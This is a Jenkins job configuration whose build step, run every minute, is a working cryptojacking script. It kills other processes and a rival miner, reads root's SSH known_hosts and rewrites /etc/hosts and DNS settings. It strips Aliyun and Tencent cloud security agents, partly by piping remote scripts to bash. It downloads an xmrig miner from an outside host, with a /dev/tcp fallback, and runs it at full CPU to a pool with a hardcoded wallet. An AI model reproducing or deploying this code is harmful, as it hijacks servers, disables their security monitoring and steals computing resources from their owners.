<?xml version='1.1' encoding='UTF-8'?>
<project>
  <description></description>
  <keepDependencies>false</keepDependencies>
  <properties>
    <com.dabsquared.gitlabjenkins.connection.GitLabConnectionProperty plugin="gitlab-plugin@1.5.20">
      <gitLabConnection></gitLabConnection>
      <jobCredentialId></jobCredentialId>
      <useAlternativeCredential>false</useAlternativeCredential>
    </com.dabsquared.gitlabjenkins.connection.GitLabConnectionProperty>
  </properties>
  <scm class="hudson.scm.NullSCM"/>
  <canRoam>true</canRoam>
  <disabled>false</disabled>
  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
  <triggers>
    <hudson.triggers.TimerTrigger>
      <spec>* * * * *</spec>
    </hudson.triggers.TimerTrigger>
  </triggers>
  <concurrentBuild>false</concurrentBuild>
  <builders>
    <hudson.tasks.Shell>
      <command>#!/bin/bash
curl http://lumtest.com/myip.json
echo &apos;\n#############################################################################&apos;
cat /tmp/log.txt
rm -rf /tmp/log.txt
whoami
cat /root/.ssh/known_hosts
nvcc -V;nvidia-smi;lspci | grep -i nvidia;ps -ef|grep xmrig
echo &apos;#############################################################################&apos;
threadCount=$(lscpu | grep &apos;CPU(s)&apos; | grep -v &apos;,&apos; | awk &apos;{print $2}&apos; | head -n 1);
echo &quot;${threadCount}&quot;;
initdir=$PWD
lscpu
kill -9 $(pidof sysrv)
if [[ $(whoami) != &quot;&quot; ]]; then
for tr in $(ps -U $(whoami) | egrep -v &quot;java|ps|sh|egrep|grep|PID&quot; | cut -b1-6); do
   kill -9 $tr || : ;
done;
fi
echo thxforjobs
echo no &gt; /etc/hosts
echo &apos;nameserver 1.1.1.1&apos; &gt; /etc/resolv.conf;echo &apos;nameserver 8.8.8.8&apos; &gt;&gt; /etc/resolv.conf;echo &apos;nameserver 180.76.76.76&apos; &gt;&gt; /etc/resolv.conf
echo &quot;0.0.0.0 blockchain.info&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 35.225.36.167&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 100.100.25.3 jsrv.aegis.aliyun.com&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 100.100.25.4 update.aegis.aliyun.co&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 185.164.72.119&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 163.172.191.181&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 pool.supportxmr.com&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 pinto.mamointernet.icu&quot; &gt;&gt; /etc/hosts;echo &quot;0.0.0.0 sdk.bce.baidu.com&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 lsd.systemten.org&quot; &gt;&gt; /etc/hosts;
echo &quot;0.0.0.0 pool.minexmr.com&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 minexmr.com&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 Pool.XCA.CryptoPool.Space&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 sg.minexmr.com&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 pool.supportxmr.com&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 xmr-asia1.nanopool.org&quot; &gt;&gt; /etc/hosts
echo &quot;0.0.0.0 xmr-jp1.nanopool.org&quot; &gt;&gt; /etc/hosts
iptables -A INPUT -p tcp --tcp-flags RST RST -j DROP

echo &quot;nope&quot; &gt;/tmp/log_rot;
sysctl kernel.nmi_watchdog=0
echo &apos;0&apos; &gt; /proc/sys/kernel/nmi_watchdog
echo &apos;kernel.nmi_watchdog=0&apos; &gt;&gt; /etc/sysctl.conf

if ps aux | grep -i &apos;[a]liyun&apos;; then
curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
pkill aliyun-service
rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
rm -rf /usr/local/aegis*
systemctl stop aliyun.service
systemctl disable aliyun.service
service bcm-agent stop
yum remove bcm-agent -y
apt-get remove bcm-agent -y
elif ps aux | grep -i &apos;[y]unjing&apos;; then
/usr/local/qcloud/stargate/admin/uninstall.sh
/usr/local/qcloud/YunJing/uninst.sh
/usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi

threadCount=$(lscpu | grep &apos;CPU(s)&apos; | grep -v &apos;,&apos; | awk &apos;{print $2}&apos; | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo &quot;${hostHash} - ${threadCount}&quot;;

_curl () {
read proto server path &lt;&lt;&lt;$(echo ${1//// })
DOC=/${path// //}
HOST=${server//:*}
PORT=${server//*:}
[[ x&quot;${HOST}&quot; == x&quot;${PORT}&quot; ]] &amp;&amp; PORT=80

exec 3&lt;&gt;/dev/tcp/${HOST}/$PORT
echo -en &quot;GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n&quot; &gt;&amp;3
(while read line; do
[[ &quot;$line&quot; == $&apos;\r&apos; ]] &amp;&amp; break
done &amp;&amp; cat) &lt;&amp;3
exec 3&gt;&amp;-
}

rm -rf config.json;

d () {
curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2&gt; /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2&gt; /dev/null || _curl $1 &gt; $2;
}

test ! -s trace &amp;&amp; \
d http://tiktok.wenkaisb.info/xmrig-6.7.0-linux-static-x64.tar.gz trace.tgz &amp;&amp; \
tar -zxvf trace.tgz &amp;&amp; \
mv xmrig-6.7.0/xmrig trace &amp;&amp; \
rm -rf xmrig-6.7.0 &amp;&amp; \
rm -rf trace.tgz;

test ! -x trace &amp;&amp; chmod +x trace;

k() {
./trace \
   -R 2 \
   --keepalive \
   --no-color \
   --donate-level 1 \
   --max-cpu-usage 100 \
   --cpu-priority 3 \
   --threads ${threadCount} \
   --print-time 25 \
   --url $1 \
   --user 47eqhWc4e88EVdqbnwEJaD5aSzYvV2BT29dmceHJbL5HdiVMPRkp8suhYHTwYGNYmDLef7Yc4crLnQ4gB7rmAiK3Txtxtrw \
   --pass 2021jenkins \
   --keepalive
}

k mine.c3pool.com:80</command>
      <configuredLocalRules/>
    </hudson.tasks.Shell>
  </builders>
  <publishers/>
  <buildWrappers/>
</project>